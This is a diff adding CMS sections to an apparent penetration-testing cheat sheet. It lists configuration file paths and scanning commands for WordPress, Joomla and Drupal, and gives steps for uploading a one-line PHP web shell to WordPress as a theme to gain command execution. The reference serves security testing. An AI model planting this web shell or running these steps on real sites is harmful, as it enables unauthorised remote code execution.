@@ -272,6 +272,60 @@ apache-users -h 192.1.1.1 -l /usr/share/wordlists/metasploit/unix\_users.txt -p 
 {% endtab %}
 {% endtabs %}
 
+{% tabs %}
+{% tab title="WordPress" %}
+**WordPress default database configuration filename**  
+&lt;web-app-path&gt;  
+**WordPress default login page**  
+&lt;web-app-path&gt;/wp-login.php  
+**WordPress plugins**  
+&lt;web-app-path&gt;/wp-content/plugins  
+**Scanning WordPress for plugins and versions**  
+/pentest/web/wpscan/wpscan.rb --url &lt;target-and-wordpress-path&gt; --proxy &lt;proxy-addr:port&gt; -enumerate \[u\|p\|v\|t\]   
+/pentest/enumeration/web/cms-explorer  -url &lt;target-and-wordpress-path&gt; -type wordpress  
+**Newer WP: "Themes" can be uploaded as zip files by WP administrators i.e. you:**  
+mkdir wpx  
+vi wpx/cmd.php  
+cat wpx/cmd.php  
+&lt;?php system\($\_GET\['cmd'\]\) ?&gt;  
+zip -r wpx.zip wpx  
+**upload wpx.zip via web interface as an installed theme**  
+**Command execution access is via:**   
+&lt;web-app-path&gt;/wp-content/plugins/wpx/cmd.php?cmd=&lt;command\(s\)&gt;   
+Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension \(e.g. .php\)
+{% endtab %}
+
+{% tab title="Joomla" %}
+**Joomla default database configuration filename**  
+&lt;web-app-path&gt;/configuration.php  
+**Scanning Joomla! for plugins and versions**  
+/pentest/web/scanners/joomscan/joomscan.pl -u &lt;target-and-joomla-path&gt;  
+/pentest/enumeration/web/cms-explorer  -url &lt;target-and-joomla-path&gt; -type joomla
+{% endtab %}
+
+{% tab title="Other" %}
+**Cacti**  
+**Cacti default database configuration filename**  
+&lt;web-app-path&gt;/include/config.php  
+  
+  
+**DeV!L\`z ClanPortal**  
+**DeV!L\`z ClanPortal default database configuration filename**  
+&lt;web-app-path&gt;/inc/mysql.php  
+  
+**Drupal  
+Drupal default database configuration filename**  
+&lt;web-app-path&gt;/sites/default/settings.php  
+  
+**Scanning Drupal for plugins and versions**  
+/pentest/enumeration/web/cms-explorer  -url &lt;target-and-drupal-path&gt; -type drupal  
+PHPMyAdmin/phpmyadmin/changelog.php  
+  
+**TimeclockTimeclock**  
+default database configuration filename&lt;web-app-path&gt;/db.php
+{% endtab %}
+{% endtabs %}
+
 ### LFISuite
 
 ### fimap
